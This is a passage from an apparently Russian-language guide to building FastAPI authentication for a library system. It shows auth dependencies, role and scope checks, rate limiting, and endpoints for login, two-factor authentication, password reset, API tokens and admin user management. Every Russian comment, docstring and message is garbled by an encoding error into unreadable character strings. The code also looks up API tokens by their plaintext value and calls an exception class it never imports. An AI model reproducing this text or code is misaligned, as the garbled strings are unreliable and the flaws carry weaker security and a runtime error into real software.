        raise UnauthorizedException(detail="–¢—Ä–µ–±—É–µ—Ç—Å—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è")
    
    return user_data

async def _get_user_from_oauth_token(token: str, db: AsyncSession) -> Optional[dict]:
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ OAuth2 JWT —Ç–æ–∫–µ–Ω–∞"""
    try:
        payload = verify_token(token)
        if not payload:
            return None
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–∏–ø–∞ —Ç–æ–∫–µ–Ω–∞
        if payload.get("type") != "access":
            return None
        
        user_id = payload.get("sub")
        if not user_id:
            return None
        
        # –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –ë–î
        auth_service = AuthService(db)
        user = await auth_service.get_user_by_id(int(user_id))
        
        if not user or not user.is_active():
            return None
        
        return {
            "id": user.id,
            "email": user.email,
            "username": user.username,
            "role": user.role,
            "is_active": user.status.value == "active",
            "is_email_verified": user.is_email_verified,
            "two_factor_enabled": user.two_factor_enabled,
            "auth_method": "oauth"
        }
        
    except JWTError as e:
        logger.warning(f"JWT validation error: {e}")
        return None
    except Exception as e:
        logger.error(f"Error getting user from OAuth token: {e}")
        return None

async def _get_user_from_api_token(token: str, db: AsyncSession) -> Optional[dict]:
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ API —Ç–æ–∫–µ–Ω–∞"""
    try:
        # –ü–æ–∏—Å–∫ —Ç–æ–∫–µ–Ω–∞ –≤ –ë–î
        from app.models.api_token import APIToken
        from sqlalchemy import select
        
        query = select(APIToken).where(
            APIToken.token == token,
            APIToken.is_active == True
        )
        
        result = await db.execute(query)
        api_token = result.scalar_one_or_none()
        
        if not api_token:
            return None
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ä–æ–∫–∞ –¥–µ–π—Å—Ç–≤–∏—è
        if api_token.is_expired():
            return None
        
        # –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏ –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è
        api_token.last_used = datetime.now(timezone.utc)
        await db.flush()  # –ò—Å–ø–æ–ª—å–∑—É–µ–º flush, —Ç–∞–∫ –∫–∞–∫ get_db —É–ø—Ä–∞–≤–ª—è–µ—Ç commit
        
        # –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        user = api_token.user
        
        if not user or not user.is_active():
            return None
        
        # –ü–∞—Ä—Å–∏–Ω–≥ scopes
        scopes = []
        if api_token.scopes:
            try:
                scopes = json.loads(api_token.scopes)
            except (json.JSONDecodeError, TypeError):
                scopes = []
        
        return {
            "id": user.id,
            "email": user.email,
            "username": user.username,
            "role": user.role,
            "is_active": user.status.value == "active",
            "auth_method": "api_token",
            "api_token_id": api_token.id,
            "scopes": scopes
        }
        
    except Exception as e:
        logger.error(f"Error getting user from API token: {e}")
        return None

async def get_current_active_user(
    current_user: dict = Depends(get_current_user)
) -> dict:
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    if not current_user.get("is_active", False):
        raise ForbiddenException(detail="–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ–∞–∫—Ç–∏–≤–µ–Ω")
    
    return current_user

async def get_current_verified_user(
    current_user: dict = Depends(get_current_active_user)
) -> dict:
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–Ω—ã–º email"""
    if not current_user.get("is_email_verified", False):
        raise ForbiddenException(
            detail="–¢—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ email",
            required_actions=["verify_email"]
        )
    
    return current_user

# –§–∞–±—Ä–∏–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–æ–ª–µ–π
def require_role(required_role: UserRole):
    """–ó–∞–≤–∏—Å–∏–º–æ—Å—Ç—å –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π —Ä–æ–ª–∏"""
    async def role_checker(
        current_user: dict = Depends(get_current_active_user)
    ) -> dict:
        if current_user["role"] != required_role.value:
            raise ForbiddenException(
                detail=f"–¢—Ä–µ–±—É–µ—Ç—Å—è —Ä–æ–ª—å {required_role.value}",
                required_roles=[required_role.value]
            )
        return current_user
    return role_checker

def require_roles(required_roles: List[UserRole]):
    """–ó–∞–≤–∏—Å–∏–º–æ—Å—Ç—å –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–ø–∏—Å–∫–∞ —Ä–æ–ª–µ–π"""
    allowed_roles = [role.value for role in required_roles]
    
    async def roles_checker(
        current_user: dict = Depends(get_current_active_user)
    ) -> dict:
        if current_user["role"] not in allowed_roles:
            raise ForbiddenException(
                detail=f"–¢—Ä–µ–±—É–µ—Ç—Å—è –æ–¥–Ω–∞ –∏–∑ —Ä–æ–ª–µ–π: {', '.join(allowed_roles)}",
                required_roles=allowed_roles
            )
        return current_user
    return roles_checker

# –ó–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã—Ö —Ä–æ–ª–µ–π
require_super_admin = require_role(UserRole.SUPER_ADMIN)
require_admin = require_roles([UserRole.SUPER_ADMIN, UserRole.ADMIN])
require_librarian = require_roles([UserRole.SUPER_ADMIN, UserRole.ADMIN, UserRole.LIBRARIAN])
require_reader = require_roles([UserRole.SUPER_ADMIN, UserRole.ADMIN, UserRole.LIBRARIAN, UserRole.READER])

# –ó–∞–≤–∏—Å–∏–º–æ—Å—Ç—å –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ scopes (–¥–ª—è API —Ç–æ–∫–µ–Ω–æ–≤)
def require_scope(required_scope: str):
    """–ó–∞–≤–∏—Å–∏–º–æ—Å—Ç—å –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ scope —É API —Ç–æ–∫–µ–Ω–∞"""
    async def scope_checker(
        current_user: dict = Depends(get_current_user)
    ) -> dict:
        # –î–ª—è OAuth –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ scopes –Ω–µ—Ç
        if current_user["auth_method"] == "oauth":
            return current_user
        
        # –î–ª—è API —Ç–æ–∫–µ–Ω–æ–≤ –ø—Ä–æ–≤–µ—Ä—è–µ–º scopes
        if current_user["auth_method"] == "api_token":
            if required_scope not in current_user.get("scopes", []):
                raise ForbiddenException(
                    detail=f"–¢—Ä–µ–±—É–µ—Ç—Å—è scope: {required_scope}",
                    required_scopes=[required_scope]
                )
        
        return current_user
    return scope_checker

# –ó–∞–≤–∏—Å–∏–º–æ—Å—Ç—å –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏, —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å–∞–º –∏–ª–∏ –∞–¥–º–∏–Ω
def require_self_or_admin(user_id: int):
    """–ó–∞–≤–∏—Å–∏–º–æ—Å—Ç—å –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏, —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ä–µ–¥–∞–∫—Ç–∏—Ä—É–µ—Ç —Å–µ–±—è –∏–ª–∏ –∞–¥–º–∏–Ω"""
    async def checker(
        current_user: dict = Depends(get_current_active_user)
    ) -> dict:
        is_admin = current_user["role"] in [
            UserRole.ADMIN.value, 
            UserRole.SUPER_ADMIN.value
        ]
        is_self = current_user["id"] == user_id
        
        if not (is_self or is_admin):
            raise ForbiddenException(
                detail="–ú–æ–∂–Ω–æ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ —Å–≤–æ–π –ø—Ä–æ—Ñ–∏–ª—å –∏–ª–∏ –±—ã—Ç—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º"
            )
        
        return current_user
    return checker

# Rate limiting –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å –¥–ª—è —Ä–∞–∑–Ω—ã—Ö —Ç–∏–ø–æ–≤ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
async def get_rate_limit_key(
    request: Request,
    current_user: Optional[dict] = Depends(get_current_user)
) -> str:
    """
    –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–ª—é—á–∞ –¥–ª—è rate limiting
    
    –ê–Ω–æ–Ω–∏–º–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏: –ø–æ IP
    –ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã–µ: –ø–æ user_id
    """
    if current_user:
        return f"user:{current_user['id']}"
    
    client_ip = request.client.host if request.client else "unknown"
    return f"ip:{client_ip}"
```

### **6.1. Rate Limiting (–∑–∞—â–∏—Ç–∞ –æ—Ç –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞)**

–î–ª—è –∑–∞—â–∏—Ç—ã –æ—Ç –±—Ä—É—Ç—Ñ–æ—Ä—Å-–∞—Ç–∞–∫ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å rate limiting. –í–æ—Ç –ø—Ä–∏–º–µ—Ä —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏:

```python
# app/core/rate_limit.py
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded
from fastapi import Request

limiter = Limiter(key_func=get_remote_address)

# –í main.py:
from slowapi.errors import RateLimitExceeded
from slowapi import Limiter, _rate_limit_exceeded_handler

app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤ endpoints:
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@router.post("/login")
@limiter.limit("5/minute")  # –ú–∞–∫—Å–∏–º—É–º 5 –ø–æ–ø—ã—Ç–æ–∫ –≤ –º–∏–Ω—É—Ç—É
async def login(request: Request, ...):
    ...
```

**–î–æ–±–∞–≤–∏—Ç—å –≤ requirements.txt:**
```txt
slowapi==0.1.9  # Rate limiting –¥–ª—è FastAPI
```

### **7. Endpoints –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏**

```python
# app/api/v1/endpoints/auth.py
import logging
from typing import List
from fastapi import APIRouter, Depends, HTTPException, status, Request, Response
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy.ext.asyncio import AsyncSession

from app.api.deps import get_db, get_current_user, require_admin, require_self_or_admin
from app.schemas.auth import (
    UserRegister, Token, UserLogin,
    PasswordResetRequest, PasswordResetConfirm,
    ChangePassword, TwoFactorSetup, TwoFactorVerify,
    APITokenCreate, APITokenResponse
)
from app.services.auth_service import AuthService
from app.core.exceptions import UnauthorizedException, ValidationException

router = APIRouter(prefix="/auth", tags=["authentication"])
logger = logging.getLogger(__name__)

# ===== –†–ï–ì–ò–°–¢–†–ê–¶–ò–Ø –ò –í–•–û–î =====

@router.post("/register", status_code=status.HTTP_201_CREATED)
async def register(
    user_data: UserRegister,
    db: AsyncSession = Depends(get_db),
    request: Request = None
):
    """–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –Ω–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    auth_service = AuthService(db)
    
    try:
        user = await auth_service.register(user_data)
        
        return {
            "success": True,
            "message": "–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞. –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ email.",
            "user_id": user.id,
            "email": user.email
        }
        
    except Exception as e:
        logger.error(f"Registration error: {e}")
        raise

@router.post("/login", response_model=Token)
async def login(
    form_data: OAuth2PasswordRequestForm = Depends(),
    db: AsyncSession = Depends(get_db),
    request: Request = None
):
    """–í—Ö–æ–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    auth_service = AuthService(db)
    
    # –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è OAuth2 —Ñ–æ—Ä–º—ã –≤ –Ω–∞—à—É —Å—Ö–µ–º—É
    login_data = UserLogin(
        username=form_data.username,
        password=form_data.password,
        remember_me=form_data.scopes and "remember_me" in form_data.scopes
    )
    
    user_agent = request.headers.get("user-agent", "")
    ip_address = request.client.host if request.client else "unknown"
    
    try:
        user, tokens = await auth_service.login(login_data, user_agent, ip_address)
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ 2FA
        if user.two_factor_enabled:
            return {
                "access_token": tokens.access_token,
                "refresh_token": "",
                "token_type": "2fa_required",
                "expires_in": tokens.expires_in,
                "message": "–¢—Ä–µ–±—É–µ—Ç—Å—è –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è"
            }
        
        return tokens
        
    except UnauthorizedException as e:
        logger.warning(f"Login failed for {form_data.username}: {e.detail}")
        raise
    except Exception as e:
        logger.error(f"Login error: {e}")
        raise

@router.post("/login/2fa/verify", response_model=Token)
async def verify_two_factor_login(
    verify_data: TwoFactorVerify,
    db: AsyncSession = Depends(get_db),
    request: Request = None
):
    """–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ø—Ä–∏ –≤—Ö–æ–¥–µ"""
    auth_service = AuthService(db)
    
    # –ü–æ–ª—É—á–µ–Ω–∏–µ 2FA —Ç–æ–∫–µ–Ω–∞ –∏–∑ –∑–∞–≥–æ–ª–æ–≤–∫–∞
    auth_header = request.headers.get("authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        raise UnauthorizedException(detail="–¢—Ä–µ–±—É–µ—Ç—Å—è 2FA —Ç–æ–∫–µ–Ω")
    
    two_factor_token = auth_header.replace("Bearer ", "")
    
    user_agent = request.headers.get("user-agent", "")
    ip_address = request.client.host if request.client else "unknown"
    
    try:
        user, tokens = await auth_service.verify_two_factor_login(
            two_factor_token,
            verify_data.code,
            user_agent,
            ip_address
        )
        
        return tokens
        
    except ValidationException as e:
        logger.warning(f"2FA verification failed: {e.detail}")
        raise
    except Exception as e:
        logger.error(f"2FA verification error: {e}")
        raise

@router.post("/refresh", response_model=Token)
async def refresh_token(
    refresh_token: str,
    db: AsyncSession = Depends(get_db)
):
    """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ access —Ç–æ–∫–µ–Ω–∞"""
    auth_service = AuthService(db)
    
    try:
        tokens = await auth_service.refresh_token(refresh_token)
        return tokens
        
    except UnauthorizedException as e:
        logger.warning(f"Token refresh failed: {e.detail}")
        raise
    except Exception as e:
        logger.error(f"Token refresh error: {e}")
        raise

@router.post("/logout")
async def logout(
    refresh_token: str,
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(get_current_user)
):
    """–í—ã—Ö–æ–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    auth_service = AuthService(db)
    
    success = await auth_service.logout(refresh_token)
    
    return {
        "success": success,
        "message": "–í—ã—Ö–æ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω —É—Å–ø–µ—à–Ω–æ"
    }

@router.post("/logout/all")
async def logout_all(
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(get_current_user)
):
    """–í—ã—Ö–æ–¥ —Å–æ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤"""
    auth_service = AuthService(db)
    
    success = await auth_service.logout_all_sessions(current_user["id"])
    
    return {
        "success": success,
        "message": "–í—ã—Ö–æ–¥ —Å–æ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –≤—ã–ø–æ–ª–Ω–µ–Ω"
    }

# ===== –°–ë–†–û–° –ò –ò–ó–ú–ï–ù–ï–ù–ò–ï –ü–ê–†–û–õ–Ø =====

@router.post("/password/reset/request")
async def request_password_reset(
    reset_request: PasswordResetRequest,
    db: AsyncSession = Depends(get_db)
):
    """–ó–∞–ø—Ä–æ—Å –Ω–∞ —Å–±—Ä–æ—Å –ø–∞—Ä–æ–ª—è"""
    auth_service = AuthService(db)
    
    success = await auth_service.request_password_reset(reset_request.email)
    
    return {
        "success": True,
        "message": "–ï—Å–ª–∏ email –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω, –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã"
    }

@router.post("/password/reset/confirm")
async def confirm_password_reset(
    reset_data: PasswordResetConfirm,
    db: AsyncSession = Depends(get_db)
):
    """–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Å–±—Ä–æ—Å–∞ –ø–∞—Ä–æ–ª—è"""
    auth_service = AuthService(db)
    
    success = await auth_service.reset_password(reset_data)
    
    return {
        "success": success,
        "message": "–ü–∞—Ä–æ–ª—å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω"
    }

@router.post("/password/change")
async def change_password(
    password_data: ChangePassword,
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(get_current_user)
):
    """–ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è (–¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)"""
    auth_service = AuthService(db)
    
    success = await auth_service.change_password(current_user["id"], password_data)
    
    return {
        "success": success,
        "message": "–ü–∞—Ä–æ–ª—å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω"
    }

# ===== –î–í–£–•–§–ê–ö–¢–û–†–ù–ê–Ø –ê–£–¢–ï–ù–¢–ò–§–ò–ö–ê–¶–ò–Ø =====

@router.post("/2fa/setup")
async def setup_two_factor(
    setup_data: TwoFactorSetup,
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(get_current_user)
):
    """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
    auth_service = AuthService(db)
    
    result = await auth_service.setup_two_factor(current_user["id"], setup_data.password)
    
    return {
        "success": True,
        "data": result,
        "message": "–û—Ç—Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR –∫–æ–¥ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä–∞"
    }

@router.post("/2fa/verify")
async def verify_two_factor_setup(
    verify_data: TwoFactorVerify,
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(get_current_user)
):
    """–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
    auth_service = AuthService(db)
    
    success = await auth_service.verify_two_factor_setup(current_user["id"], verify_data.code)
    
    return {
        "success": success,
        "message": "–î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–∞"
    }

@router.post("/2fa/disable")
async def disable_two_factor(
    setup_data: TwoFactorSetup,
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(get_current_user)
):
    """–û—Ç–∫–ª—é—á–µ–Ω–∏–µ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
    auth_service = AuthService(db)
    
    success = await auth_service.disable_two_factor(current_user["id"], setup_data.password)
    
    return {
        "success": success,
        "message": "–î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –æ—Ç–∫–ª—é—á–µ–Ω–∞"
    }

# ===== API –¢–û–ö–ï–ù–´ =====

@router.post("/tokens", response_model=APITokenResponse)
async def create_api_token(
    token_data: APITokenCreate,
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(get_current_user)
):
    """–°–æ–∑–¥–∞–Ω–∏–µ API —Ç–æ–∫–µ–Ω–∞"""
    auth_service = AuthService(db)
    
    api_token = await auth_service.create_api_token(current_user["id"], token_data)
    
    return APITokenResponse.model_validate(api_token)

@router.get("/tokens", response_model=List[APITokenResponse])
async def get_api_tokens(
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(get_current_user)
):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ API —Ç–æ–∫–µ–Ω–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    auth_service = AuthService(db)
    
    tokens = await auth_service.get_user_api_tokens(current_user["id"])
    
    return [APITokenResponse.model_validate(token) for token in tokens]

@router.delete("/tokens/{token_id}")
async def revoke_api_token(
    token_id: int,
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(get_current_user)
):
    """–û—Ç–∑—ã–≤ API —Ç–æ–∫–µ–Ω–∞"""
    auth_service = AuthService(db)
    
    success = await auth_service.revoke_api_token(current_user["id"], token_id)
    
    return {
        "success": success,
        "message": "API —Ç–æ–∫–µ–Ω –æ—Ç–æ–∑–≤–∞–Ω"
    }

# ===== –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–ï =====

@router.get("/me")
async def get_current_user_info(
    current_user: dict = Depends(get_current_user)
):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ç–µ–∫—É—â–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ"""
    return {
        "success": True,
        "data": current_user
    }

@router.get("/sessions")
async def get_user_sessions(
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(get_current_user)
):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    from app.models.session import UserSession
    from sqlalchemy import select
    from datetime import datetime, timezone
    
    query = select(UserSession).where(
        UserSession.user_id == current_user["id"],
        UserSession.is_active == True,
        UserSession.expires_at > datetime.now(timezone.utc)
    ).order_by(UserSession.last_activity.desc())
    
    result = await db.execute(query)
    sessions = result.scalars().all()
    
    sessions_data = []
    for session in sessions:
        sessions_data.append({
            "id": session.id,
            "user_agent": session.user_agent,
            "ip_address": session.ip_address,
            "last_activity": session.last_activity,
            "expires_at": session.expires_at,
            "created_at": session.created_at
        })
    
    return {
        "success": True,
        "data": sessions_data,
        "count": len(sessions_data)
    }
```

### **8. Endpoints —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏ (–∞–¥–º–∏–Ω)**

```python
# app/api/v1/endpoints/admin/users.py
import logging
from typing import List
from fastapi import APIRouter, Depends, Query
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, or_

from app.api.deps import get_db, require_admin
from app.models.user import User, UserRole, UserStatus
from app.schemas.user import UserResponse, UserUpdate
from app.services.auth_service import AuthService

router = APIRouter(prefix="/admin/users", tags=["admin-users"])
logger = logging.getLogger(__name__)

@router.get("/", response_model=List[UserResponse])
async def get_users(
    q: str = Query(None, description="–ü–æ–∏—Å–∫ –ø–æ email –∏–ª–∏ username"),
    role: UserRole = Query(None, description="–§–∏–ª—å—Ç—Ä –ø–æ —Ä–æ–ª–∏"),
    status: UserStatus = Query(None, description="–§–∏–ª—å—Ç—Ä –ø–æ —Å—Ç–∞—Ç—É—Å—É"),
    skip: int = Query(0, ge=0),
    limit: int = Query(100, ge=1, le=1000),
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(require_admin)
):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π (—Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–æ–≤)"""
    query = select(User).where(User.deleted_at == None)
    
    # –ü–æ–∏—Å–∫
    if q:
        query = query.where(
            or_(
                User.email.ilike(f"%{q}%"),
                User.username.ilike(f"%{q}%"),
                User.full_name.ilike(f"%{q}%")
            )
        )
    
    # –§–∏–ª—å—Ç—Ä—ã
    if role:
        query = query.where(User.role == role)
    
    if status:
        query = query.where(User.status == status)
    
    # –ü–∞–≥–∏–Ω–∞—Ü–∏—è –∏ —Å–æ—Ä—Ç–∏—Ä–æ–≤–∫–∞
    query = query.order_by(User.created_at.desc()).offset(skip).limit(limit)
    
    result = await db.execute(query)
    users = result.scalars().all()
    
    return [UserResponse.model_validate(user) for user in users]

@router.get("/{user_id}", response_model=UserResponse)
async def get_user(
    user_id: int,
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(require_admin)
):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ (–∞–¥–º–∏–Ω)"""
    auth_service = AuthService(db)
    user = await auth_service.get_user_by_id(user_id)
    
    if not user:
        raise NotFoundException(resource_name="user", resource_id=user_id)
    
    return UserResponse.model_validate(user)

@router.put("/{user_id}/role")
async def update_user_role(
    user_id: int,
    new_role: UserRole,
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(require_admin)
):
    """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ä–æ–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–∞–¥–º–∏–Ω)"""
    auth_service = AuthService(db)
    
    user = await auth_service.update_user_role(user_id, new_role, current_user["id"])
    
    return {
        "success": True,
        "message": f"–†–æ–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ {new_role.value}",
        "user": UserResponse.model_validate(user)
    }

@router.put("/{user_id}/status")
async def update_user_status(
    user_id: int,
    new_status: UserStatus,
    reason: str = Query(None, description="–ü—Ä–∏—á–∏–Ω–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞"),
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(require_admin)
):
    """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–∞–¥–º–∏–Ω)"""
    auth_service = AuthService(db)
    
    user = await auth_service.update_user_status(user_id, new_status, reason)
    
    return {
        "success": True,
        "message": f"–°—Ç–∞—Ç—É—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω –Ω–∞ {new_status.value}",
        "user": UserResponse.model_validate(user)
    }

@router.delete("/{user_id}")
async def delete_user(
    user_id: int,
    reason: str = Query(..., description="–ü—Ä–∏—á–∏–Ω–∞ —É–¥–∞–ª–µ–Ω–∏—è"),
    db: AsyncSession = Depends(get_db),
    current_user: dict = Depends(require_admin)
):
    """–ú—è–≥–∫–æ–µ —É–¥–∞–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–∞–¥–º–∏–Ω)"""
    # –ù–µ–ª—å–∑—è —É–¥–∞–ª–∏—Ç—å —Å–µ–±—è
    if user_id == current_user["id"]:
